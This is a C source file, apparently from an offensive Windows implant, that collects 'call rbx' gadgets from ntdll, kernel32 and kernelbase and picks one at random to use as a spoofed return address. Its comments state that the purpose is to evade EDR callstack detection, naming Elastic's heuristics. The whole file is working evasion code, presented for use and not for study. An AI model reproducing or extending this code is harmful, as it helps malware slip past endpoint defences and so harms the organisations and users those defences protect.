// =============================================
// Gadgets.c - Call-gadget discovery and selection
// =============================================
//
// SpoofCallback picks one per-run via RDTSC so the
// return address injected into the call stack is not
// the same bytes of ntdll every execution; this
// defeats EDR rules that flag "single return-address
// frequency" (Elastic 8.11+ callstack heuristics).
//
// Register is still rbx only — SpoofCallback's asm
// stub is hard-wired to `mov rbx, target; jmp gadget`.
// =============================================

#include "Common.h"

static GADGET_POOL g_CallGadgetPool = { 0 };

// `call rbx` pattern.
static const BYTE g_CallRbxPattern[] = { 0xFF, 0xD3 };

// Populate the pool from ntdll / kernel32 / kernelbase.
// All three are loaded in every x64 Windows process;
// additional modules could be added but returns diminish
// since the cap is GADGET_POOL_CAPACITY and ntdll alone
// usually saturates.
BOOL CollectCallGadgets(VOID) {

    g_CallGadgetPool.dwCount = 0;
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"NTDLL.DLL"),       g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"KERNEL32.DLL"),    g_CallRbxPattern, sizeof(g_CallRbxPattern));
    GadgetPoolScanModule(&g_CallGadgetPool, FindLoadedModuleW(L"KERNELBASE.DLL"), g_CallRbxPattern, sizeof(g_CallRbxPattern));
    return g_CallGadgetPool.dwCount > 0;
}

PVOID GetRandomCallGadget(VOID) {
    return GadgetPoolRandom(&g_CallGadgetPool);
}
